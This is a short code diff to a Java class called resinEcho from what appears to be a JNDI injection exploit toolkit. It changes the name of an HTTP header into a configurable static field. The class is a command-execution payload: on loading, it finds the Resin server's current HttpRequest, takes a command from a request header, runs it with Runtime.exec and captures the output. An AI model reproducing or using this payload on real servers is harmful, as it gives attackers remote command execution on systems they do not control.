@@ -1,6 +1,9 @@
 package com.qi4l.jndi.template.echo;
 
 public class resinEcho {
+
+    public static String CMD_HEADER = "cmd";
+
     static {
         try {
             Class                   clazz = Thread.currentThread().getClass();
@@ -23,7 +26,7 @@ public class resinEcho {
 
                 if (obj != null && obj.getClass().getName().equals("com.caucho.server.http.HttpRequest")) {
                     com.caucho.server.http.HttpRequest httpRequest = (com.caucho.server.http.HttpRequest) obj;
-                    String                             cmd         = httpRequest.getHeader("cmd");
+                    String                             cmd         = httpRequest.getHeader(CMD_HEADER);
 
                     if (cmd != null && !cmd.isEmpty()) {
                         String                              res          = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
